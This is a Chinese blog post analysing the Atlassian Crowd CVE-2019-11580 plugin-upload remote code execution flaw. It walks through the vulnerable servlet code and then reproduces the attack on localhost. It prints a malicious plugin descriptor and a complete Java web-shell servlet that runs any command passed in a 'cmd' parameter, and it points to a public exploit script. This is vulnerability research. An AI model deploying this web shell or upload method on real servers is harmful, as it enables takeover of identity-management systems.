<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="CVE-2019-11580 Atlassian Crowd RCE简介攻击者可利用代码执行漏洞，在服务端执行任意代码，实现系统信息窃取等目标，从而造成巨大危害。Atlassian Crowd是一款企业身份管理应用，具有身份管理和单点登录功能，且通过插件进一步扩展了功能。Atlassian Crowd的插件pdkinstall中存在安全缺陷，易导致攻击者上传安装恶意插件进而达到远程代码执行的目的。">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Atlassian%20Crowd/CVE-2019-11580%20Atlassian%20Crowd%20RCE/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="CVE-2019-11580 Atlassian Crowd RCE简介攻击者可利用代码执行漏洞，在服务端执行任意代码，实现系统信息窃取等目标，从而造成巨大危害。Atlassian Crowd是一款企业身份管理应用，具有身份管理和单点登录功能，且通过插件进一步扩展了功能。Atlassian Crowd的插件pdkinstall中存在安全缺陷，易导致攻击者上传安装恶意插件进而达到远程代码执行的目的。">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-07-08T06:25:53.273Z">
<meta property="article:modified_time" content="2022-07-08T09:06:16.939Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Atlassian Crowd/CVE-2019-11580 Atlassian Crowd RCE" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Atlassian%20Crowd/CVE-2019-11580%20Atlassian%20Crowd%20RCE/" class="article-date">
  <time datetime="2022-07-08T06:25:53.273Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2019-11580-Atlassian-Crowd-RCE"><a href="#CVE-2019-11580-Atlassian-Crowd-RCE" class="headerlink" title="CVE-2019-11580 Atlassian Crowd RCE"></a>CVE-2019-11580 Atlassian Crowd RCE</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>攻击者可利用代码执行漏洞，在服务端执行任意代码，实现系统信息窃取等目标，从而造成巨大危害。Atlassian Crowd是一款企业身份管理应用，具有身份管理和单点登录功能，且通过插件进一步扩展了功能。Atlassian Crowd的插件pdkinstall中存在安全缺陷，易导致攻击者上传安装恶意插件进而达到远程代码执行的目的。</p>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>本节主要分析Atlassian Crowd的pdkinstall插件信息。输入命令【git clone <a target="_blank" rel="noopener" href="https://bitbucket.org/atlassian/pdkinstall-plugin%E3%80%91">https://bitbucket.org/atlassian/pdkinstall-plugin】</a> 下载插件源码，使用IDEA打开，如下图。</p>
<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/t0159a7b911809423b4.png">![img](/resource/Untitled/media/t0159a7b911809423b4.png)</a></p>
<p>首先，分析插件描述文件【atlassian-plugin.xml】。此文件采用XML格式数据重点说明插件模块与servlet的关联信息，内容如下。</p>
<p><a target="_blank" rel="noopener" href="https://p4.ssl.qhimg.com/t01ba1499cc1fbdc115.png">![img](/resource/Untitled/media/t01ba1499cc1fbdc115.png)</a></p>
<p>图中标红区域说明，访问/admin/uploadplugin.action会调用servlet功能类com.atlassian.pdkinstall.PdkInstallFilter，完成新插件的上传、检测和安装过程。因此锁定此类为安全缺陷入口。</p>
<p>接着，分析其源码。在源码中，doFilter()函数是核心函数，涉及关键插件逻辑控制语句，因此我们分两部分来分析该函数源码。第1部分的源码及解析如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException,</span><br><span class="line">ServletException &#123;</span><br><span class="line">    HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">    HttpServletResponse res = (HttpServletResponse) servletResponse;</span><br><span class="line">    // 不是post请求，就报错</span><br><span class="line">    if (!req.getMethod().equalsIgnoreCase(“post”)) &#123;</span><br><span class="line">        res.sendError(HttpServletResponse.SC_BAD_REQUEST, “Requires post”);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    // 检查是否是multipart格式数据。</span><br><span class="line">    // 数据包中，Content-Type用于表示资源的MIME类型，multipart/mixed类型主要用于传输有效的（二进制数据等）数据文件。</span><br><span class="line">    // Check that we have a file upload request</span><br><span class="line">    File tmp = null;</span><br><span class="line">    boolean isMultipart = ServletFileUpload.isMultipartContent(req);</span><br><span class="line">    if (isMultipart) &#123;</span><br><span class="line">        // 直接从数据包中提取jar文件继续安装插件</span><br><span class="line">        tmp = extractJar(req, res, tmp);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 从数据包中组合数据构建、安装插件</span><br><span class="line">        tmp = buildJarFromFiles(req);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>此方法首先判别准入POST请求，随后检查数据包的Conten-Type类型是否是multipart：如是，则直接从数据包中提取jar文件插件；否则，从数据包中构建安装jar文件插件。</p>
<p>由于此函数代码后续跟进tmp变量开展判别任务，因此我们有必要深入相关函数分析返回的tmp变量值信息。进入extractJar(）函数分析jar文件插件提取过程，如下；buildJarFromFiles()函数分析过程类似，在此不赘述。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">private File extractJar(HttpServletRequest req, HttpServletResponse res, File tmp) throws IOException &#123;</span><br><span class="line">    // Create a new file upload handler</span><br><span class="line">    ServletFileUpload upload = new ServletFileUpload(factory);</span><br><span class="line"></span><br><span class="line">    // Parse the request</span><br><span class="line">    try &#123;</span><br><span class="line">        // 新建的文件上传实例会解析请求数据包，从而解析multipart/mixed格式的插件</span><br><span class="line">        List &lt; FileItem &gt; items = upload.parseRequest(req);</span><br><span class="line">        for (FileItem item: items) &#123;</span><br><span class="line">            // 如果解析所得的数据字段以“file”开头且不属于表格字段，则判定为插件信息，据此创建插件，插件在服务端的索引位置保存在tmp变量中</span><br><span class="line">            if (item.getFieldName().startsWith(“file“) &amp;&amp; !item.isFormField()) &#123;</span><br><span class="line">                tmp = File.createTempFile(“plugindev - “, item.getName());</span><br><span class="line">                tmp.renameTo(new File(tmp.getParentFile(), item.getName()));</span><br><span class="line">                item.write(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch(FileUploadException e) &#123;</span><br><span class="line">        log.warn(e, e);</span><br><span class="line">        res.sendError(HttpServletResponse.SC_BAD_REQUEST, “Unable to process file upload”);</span><br><span class="line">    &#125; catch(Exception e) &#123;</span><br><span class="line">        log.warn(e, e);</span><br><span class="line">        res.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, “Unable to process file upload”);</span><br><span class="line">    &#125;</span><br><span class="line">    // 返回插件索引位置信息</span><br><span class="line">    return tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析可知，如果数据包中存在以 ”file_” 开头且非表单字段的文件，则据此创建插件，并将插件的服务端位置索引保存至tmp变量中；否则，保持tmp变量为 “null”。最终返回tmp变量。</p>
<p>接着继续分析doFilter() 函数的第2部分，如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// tmp不为空，确定是插件上传安装请求且插件已被探测并上传，开始安装此插件，否则响应信息“Missing plugin file”</span><br><span class="line">if (tmp != null) &#123;</span><br><span class="line">    List &lt; String &gt; errors = new ArrayList &lt; String &gt; ();</span><br><span class="line">    try &#123;</span><br><span class="line">        // 安装插件</span><br><span class="line">        errors.addAll(pluginInstaller.install(tmp));</span><br><span class="line">    &#125; catch(Exception ex) &#123;</span><br><span class="line">        log.error(ex);</span><br><span class="line">        errors.add(ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp.delete();</span><br><span class="line"></span><br><span class="line">    if (errors.isEmpty()) &#123;</span><br><span class="line">        // 安装成功，响应“Installed plugin”+“具体路径”</span><br><span class="line">        res.setStatus(HttpServletResponse.SC_OK);</span><br><span class="line">        servletResponse.setContentType(“text / plain”);</span><br><span class="line">        servletResponse.getWriter().println(“Installed plugin“ + tmp.getPath());</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 安装失败，响应“Unable to install plugin:”</span><br><span class="line">        res.setStatus(HttpServletResponse.SC_BAD_REQUEST);</span><br><span class="line">        servletResponse.setContentType(“text / plain”);</span><br><span class="line">        servletResponse.getWriter().println(“Unable to install plugin: ”);</span><br><span class="line">        for (String err: errors) &#123;</span><br><span class="line">            servletResponse.getWriter().println(“\t - “ + err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    servletResponse.getWriter().close();</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line">res.sendError(HttpServletResponse.SC_BAD_REQUEST, “Missing plugin file”);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析可知，如tmp变量不为空，则开始安装插件，且安装成功返回响应信息 “Installed plugin” +“具体路径”，安装失败返回响应信息 ”Unable to install plugin:”；如 tmp变量为空，则返回响应信息 “Missing plugin file”。</p>
<p>至此，明确Atlassian Crowd的插件管理流程后可知，并不存在明确的插件功能检测机制，因此插件易被利用。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先，编写一个恶意插件，其 “atlassian-plugin.xml” 信息如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;atlassian-plugin key=&quot;com.cdl.shell.exp&quot; name=&quot;Atlassian Manager&quot; plugins-version=&quot;2&quot; class=&quot;com.cdl.shell.exp&quot;&gt;</span><br><span class="line">&lt;plugin-info&gt;</span><br><span class="line">&lt;param name=&quot;atlassian-data-center-compatible&quot;&gt;true&lt;/param&gt;</span><br><span class="line">&lt;description&gt;Atlassian Management plugin&lt;/description&gt;</span><br><span class="line">&lt;version&gt;1.0.0&lt;/version&gt;</span><br><span class="line">&lt;/plugin-info&gt;</span><br><span class="line"></span><br><span class="line">&lt;servlet name=&quot;exploit&quot; key=&quot;exploit&quot; class=&quot;com.cdl.shell.exp&quot;&gt;</span><br><span class="line">&lt;url-pattern&gt;/exp&lt;/url-pattern&gt;</span><br><span class="line">&lt;description&gt;backdoor at /plugins/servlet/cdl&lt;/description&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">&lt;/atlassian-plugin&gt;</span><br></pre></td></tr></table></figure>

<p>分析可知，插件上传成功后，用户只需访问 /exp即可使用恶意插件servlet类com.cdl.shell.exp的功能。</p>
<p>其次，分析com.cdl.shell.exp源码，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public class exp extends javax.servlet.http.HttpServlet &#123;</span><br><span class="line"></span><br><span class="line">    public void doGet(HttpServletRequest req, HttpServletResponse res) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 接收cmd参数信息</span><br><span class="line">            String cmd = String.valueOf(req.getParameter(“cmd”));</span><br><span class="line">            String output = ””;</span><br><span class="line">            try &#123;</span><br><span class="line">                if (!cmd.equals(“”)) &#123;</span><br><span class="line">                    // 执行cmd参数命令</span><br><span class="line">                    Process p = Runtime.getRuntime().exec(cmd);</span><br><span class="line">                    InputStream out = p.getInputStream();</span><br><span class="line">                    InputStream err = p.getErrorStream();</span><br><span class="line">                    int c = ’\0’;</span><br><span class="line">                    while ((c = out.read()) != -1) &#123;</span><br><span class="line">                        res.getWriter().write((char) c);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch(Exception ex) &#123;</span><br><span class="line">                output += ”\n” + ex.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从中可知，此exp的功能是读取并执行 cmd参数值。</p>
<p>最后，编辑请求数据包以便上传恶意插件，接着在浏览器输入【<a target="_blank" rel="noopener" href="http://localhost:8095/crowd/plugins/servlet/exp?cmd=whoami%E3%80%91%E5%8D%B3%E5%8F%AF%E6%89%A7%E8%A1%8C">http://localhost:8095/crowd/plugins/servlet/exp?cmd=whoami】即可执行</a> “whoami” 命令。观察服务端的响应信息（如下），可知漏洞利用成功。</p>
<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/t01aba88dc1a98c2b0b.png">![img](/resource/Untitled/media/t01aba88dc1a98c2b0b.png)</a></p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>第一步，下载【atlassian-crowd-3.4.3】。配置启动后，访问【<a target="_blank" rel="noopener" href="http://localhost:8095/crowd%E3%80%91%EF%BC%8C">http://localhost:8095/crowd】，</a> 最终出现如下界面说明crowd服务搭建成功。</p>
<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/t01611e184d1dc36270.png">![img](/resource/Untitled/media/t01611e184d1dc36270.png)</a></p>
<p>第二步，访问链接【<a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-11580%E3%80%91">https://github.com/jas502n/CVE-2019-11580】</a> 下载恶意插件等资料，随后执行【CVE-2019-11580.py】脚本，出现如下界面说明插件上传、安装成功。</p>
<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/t017d74ab1b31da48bc.png">![img](/resource/Untitled/media/t017d74ab1b31da48bc.png)</a></p>
<p>第三步，在浏览器访问链接【<a target="_blank" rel="noopener" href="http://localhost:8095/crowd/plugins/servlet/exp?cmd=whoami%E3%80%91%EF%BC%8C">http://localhost:8095/crowd/plugins/servlet/exp?cmd=whoami】，</a> 如出现如下界面，说明成功触发代码执行漏洞。</p>
<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/t013055c1f5662b39a0.png">![img](/resource/Untitled/media/t013055c1f5662b39a0.png)</a></p>
<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p>升级至最新版。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过分析Atlassian Crowd RCE，作者认为此漏洞的根本原因在于插件管理系统未全面测试外来插件的安全性；在相关漏洞研究学习中，我们应当提升Atlassian Crowd动态调试能力，插件分析开发能力，以及Java 和Python的开发能力。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>1、 jas502n/CVE-2019-11580: CVE-2019-11580 Atlassian Crowd and Crowd Data Center RCE<br><a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-11580">https://github.com/jas502n/CVE-2019-11580</a></p>
<p>2、 CVE-2019-11580：Atlassian Crowd RCE漏洞分析 – 安全客，安全资讯平台<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/182118#h2-5">https://www.anquanke.com/post/id/182118#h2-5</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Atlassian%20Crowd/CVE-2019-11580%20Atlassian%20Crowd%20RCE/" data-id="cl5c2qmqy002zy8v13zfjh7ot" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Atlassian%20Jira/%EF%BC%88CVE-2019-11581%EF%BC%89Atlassian%20Jira%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Aria2/%EF%BC%88CVE-2016-3088%EF%BC%89Aria2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>